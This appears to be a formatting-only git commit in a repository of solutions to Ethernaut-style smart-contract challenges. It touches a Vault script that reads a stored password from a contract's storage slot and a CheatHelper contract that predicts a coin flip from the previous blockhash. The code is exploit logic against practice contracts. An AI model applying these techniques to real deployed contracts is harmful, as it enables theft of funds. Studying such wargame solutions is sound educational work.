ac02c5a02edd91ce866c9664b00769b741d9854d
Louis Bettens <louis.bettens@chainsecurity.com>
2023-08-31 13:52:43 +0200

    `forge fmt`

--- script/Vault.s.sol
+++ script/Vault.s.sol
@@ -4,7 +4,6 @@ pragma solidity ^0.8.18;
 import "forge-std/Script.sol";
 import "src/vault/Vault.sol";
 
-
 contract VaultScript is Script {
     function bonk(address eoa, Vault target) public {
         bytes32 password = vm.load(address(target), bytes32(uint256(1)));
--- src/coinflip/CheatHelper.sol
+++ src/coinflip/CheatHelper.sol
@@ -4,20 +4,19 @@ pragma solidity ^0.8.0;
 import "./CoinFlip.sol";
 
 contract CheatHelper {
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip coinflip;
 
-  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-  CoinFlip coinflip;
+    constructor(CoinFlip _coinflip) {
+        coinflip = _coinflip;
+    }
 
-  constructor(CoinFlip _coinflip) {
-	  coinflip = _coinflip;
-  }
+    function win() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
 
-  function win() public {
-    uint256 blockValue = uint256(blockhash(block.number - 1));
-
-    uint256 coinFlip = blockValue / FACTOR;
-    bool guess = coinFlip == 1 ? true : false;
-    coinflip.flip(guess);
-    assert(coinflip.consecutiveWins() != 0); // revert if for some reason we lose progress
-  }
+        uint256 coinFlip = blockValue / FACTOR;
+        bool guess = coinFlip == 1 ? true : false;
+        coinflip.flip(guess);
+        assert(coinflip.consecutiveWins() != 0); // revert if for some reason we lose progress
+    }
 }
